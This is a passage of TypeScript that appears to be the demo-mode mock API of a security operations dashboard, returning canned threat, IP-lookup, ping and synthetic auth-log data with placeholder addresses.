    switch (what) {
      case "history": return { history: history(id) };
      case "security": return posture(id);
      case "threats": return threats();
      case "vulns": return vulns(id);
      case "peers": return { peers: threats().attackers.slice(0, 12).map((a) => ({ ip: a.ip, count: a.count, geo: a.geo })) };
      case "processes": return processes(id);
      case "persistence": return persistence();
      case "connections": return connections();
      case "compliance": return { controls: CONTROLS() };
      case "fim": return fim(id);
      case "fim-baseline": return fim(id);
      case "tool": {
        const b = body as { tool: string; target: string };
        return { tool: b.tool, target: b.target, output: `$ ${b.tool} ${b.target}\n(demo) 64 bytes from ${b.target}: icmp_seq=1 ttl=57 time=12.4 ms\n64 bytes from ${b.target}: icmp_seq=2 ttl=57 time=11.9 ms\n\n--- ${b.target} statistics ---\n2 packets transmitted, 2 received, 0% packet loss`, at: NOW() };
      }
      case "investigate": {
        const b = body as { ip: string };
        const a = threats().attackers.find((x) => x.ip === b.ip);
        return { ip: b.ip, geo: a?.geo ?? { country: GEO[2].country, countryCode: GEO[2].cc, city: GEO[2].city, isp: GEO[2].isp, lat: GEO[2].lat, lon: GEO[2].lon }, rdns: "scanner.example.net", whois: ["NetRange: 203.0.113.0 - 203.0.113.255", "OrgName: Documentation Example (RFC 5737)", "Country: ZZ"], known: !!a, attackCount: a?.count ?? 0, reputation: a ? "malicious" : "unknown", at: NOW() } satisfies IpIntel;
      }
      case "logtail": {
        const lines = Array.from({ length: 120 }, (_, n) => {
          const d = new Date(NOW() - (120 - n) * 37000);
          const ts = d.toISOString().replace("T", " ").slice(0, 19);
          const a = ip(n % 9);
          return n % 5 === 0
            ? `${ts} sshd[${2100 + n}]: Failed password for invalid user admin from ${a} port ${40000 + n} ssh2`
            : n % 11 === 0
            ? `${ts} sshd[${2100 + n}]: Accepted publickey for soc from 10.20.9.4 port 51234 ssh2`
            : n % 7 === 0
            ? `${ts} sudo: deploy : TTY=pts/1 ; PWD=/srv ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx`
            : `${ts} kernel: [UFW BLOCK] IN=eth0 SRC=${a} DST=10.20.0.11 PROTO=TCP DPT=${pick([23, 445, 3389, 5900, 8080])}`;
        });
        return { path: u.searchParams.get("path") || "/var/log/auth.log", lines };
      }
    }
  }
  if ((r = m(/^\/api\/containers\/([^/]+)\/logs$/))) return { logs: "2026-10-15T09:00:01Z ready to accept connections\n2026-10-15T09:00:02Z listening on :8080\n" };
  if (m(/^\/api\/containers\//)) return { ok: true };
  if (m(/^\/api\/hosts(\/|$)/)) return { ok: true };
  const ext = demoExtRequest(method, p, body);
  if (ext !== undefined) return ext;
  throw new Error("Недоступно в демо-режимі");
}
